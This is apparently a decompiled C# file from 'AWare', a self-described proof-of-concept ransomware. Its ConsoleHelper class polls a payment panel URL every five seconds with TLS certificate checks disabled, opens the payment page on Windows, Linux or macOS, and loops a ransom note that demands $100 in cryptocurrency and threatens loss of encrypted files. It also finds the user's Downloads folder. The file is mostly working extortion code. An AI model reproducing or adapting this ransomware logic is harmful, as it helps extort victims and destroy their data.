using System;
using System.Diagnostics;
using System.Net.Http;
using System.Net.Security;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace AWare.Helper
{
	// Token: 0x02000007 RID: 7
	public static class ConsoleHelper
	{
		// Token: 0x06000019 RID: 25 RVA: 0x00002568 File Offset: 0x00000768
		public static void AsciiHeader(string sessId)
		{
			Thread thread = new Thread(delegate
			{
				for (;;)
				{
					try
					{
						HttpClientHandler httpClientHandler = new HttpClientHandler();
						httpClientHandler.ServerCertificateCustomValidationCallback = (HttpRequestMessage sender, X509Certificate2 cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true;
						HttpClient httpClient = new HttpClient(httpClientHandler);
						string result = httpClient.GetStringAsync("https://example.com/server/panel.php?MonitoringID=" + sessId).Result;
						string text2 = result.Trim();
						if (!true)
						{
						}
						ValueTuple<string, bool> valueTuple;
						if (!(text2 == "charge:pending"))
						{
							if (!(text2 == "charge:created"))
							{
								if (!(text2 == "charge:confirmed"))
								{
									valueTuple = new ValueTuple<string, bool>("You have not paid.", false);
								}
								else
								{
									valueTuple = new ValueTuple<string, bool>("Payment confirmed, entering the restoration process.", true);
								}
							}
							else
							{
								valueTuple = new ValueTuple<string, bool>("Order created, but not paid.", false);
							}
						}
						else
						{
							valueTuple = new ValueTuple<string, bool>("The payment has been made but not confirmed, please wait for 1 confirmation.", false);
						}
						if (!true)
						{
						}
						ConsoleHelper.PaymentStatus = valueTuple;
					}
					catch
					{
						continue;
					}
					Thread.Sleep(5000);
				}
			});
			thread.Start();
			bool flag = !ConsoleHelper.PaymentStatus.Item2;
			if (flag)
			{
				ConsoleHelper.OpenUrl("https://example.com/server/panel.php?sessid=" + sessId);
			}
			bool item;
			do
			{
				Console.Clear();
				Console.CursorVisible = false;
				string[] array = new string[]
				{
					"                   /\"\\",
					"                  |\\./|",
					"                  |   |   AWare - PoC Ransomware",
					"                  |   |   Version : 1.0.0 ",
					"                  |>~<|   Credits : github.com/biitez",
					"                  |   |   Session-ID : " + sessId,
					"                  |   |   Link where you must pay : https://example.com/server/panel.php",
					"                  |   |",
					"               /'\\|   |/'\\..",
					"           /~\\|   |   |   | \\   Your files are encrypted under advanced encryption (AES-256), You can only restore your files if you pay $100.",
					"          |   =[@]=   |   |  \\ ",
					"          |   |   |   |   |   \\   You have been redirected to a page where you must complete a payment of $100 via CRYPTOCURRENCY",
					"          | ~   ~   ~   ~ |`   )   in order to have your files back, if you do not make the payment, your files will be lost.",
					"          |                   /",
					"           \\                 /   We are monitoring the network every 10 seconds searching any payment, don't close the program.",
					"            \\               /   When your payment reached 1 confirmation, AWare automatically will decrypt all the files encrypted and will completely self-destruct.",
					"             \\    _____    / ",
					"              |--//''`\\--|  Be careful with the files you open from the internet.",
					"              | (( +==)) |   ",
					"              |--\\_|_//--|  What happens if you CLOSE AWare? : Nothing, when you open it it will still be waiting for your payment. (We do not recommend that you close it)",
					"              |--\\_|_//--|  What happens if you DELETE AWare? : You will not be able to recover your files.",
					"              |--\\_|_//--|\t"
				};
				Console.WriteLine(Environment.NewLine);
				foreach (string text in array)
				{
					Console.WriteLine(text);
				}
				Thread.Sleep(5000);
				item = ConsoleHelper.PaymentStatus.Item2;
			}
			while (!item);
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002704 File Offset: 0x00000904
		private static void OpenUrl(string url)
		{
			try
			{
				Process.Start(url);
			}
			catch
			{
				bool flag = RuntimeInformation.IsOSPlatform(OSPlatform.Windows);
				if (flag)
				{
					url = url.Replace("&", "^&");
					Process.Start(new ProcessStartInfo("cmd", "/c start " + url)
					{
						CreateNoWindow = true
					});
				}
				else
				{
					bool flag2 = RuntimeInformation.IsOSPlatform(OSPlatform.Linux);
					if (flag2)
					{
						Process.Start("xdg-open", url);
					}
					else
					{
						bool flag3 = RuntimeInformation.IsOSPlatform(OSPlatform.OSX);
						if (!flag3)
						{
							throw;
						}
						Process.Start("open", url);
					}
				}
			}
		}

		// Token: 0x0600001B RID: 27
		[DllImport("shell32.dll", CharSet = CharSet.Auto)]
		private static extern int SHGetKnownFolderPath(ref Guid id, int flags, IntPtr token, out IntPtr path);

		// Token: 0x0600001C RID: 28 RVA: 0x000027BC File Offset: 0x000009BC
		public static string GetDownloadsPath()
		{
			bool flag = Environment.OSVersion.Version.Major < 6;
			if (flag)
			{
				throw new NotSupportedException();
			}
			IntPtr zero = IntPtr.Zero;
			string text;
			try
			{
				ConsoleHelper.SHGetKnownFolderPath(ref ConsoleHelper._folderDownloads, 0, IntPtr.Zero, out zero);
				text = Marshal.PtrToStringUni(zero);
			}
			finally
			{
				Marshal.FreeCoTaskMem(zero);
			}
			return text;
		}

		// Token: 0x0400000F RID: 15
		[TupleElementNames(new string[] { "Log", "Paid" })]
		internal static ValueTuple<string, bool> PaymentStatus = new ValueTuple<string, bool>("You have not paid.", false);

		// Token: 0x04000010 RID: 16
		private static Guid _folderDownloads = new Guid("374DE290-123F-4565-9164-39C4925E467B");
	}
}
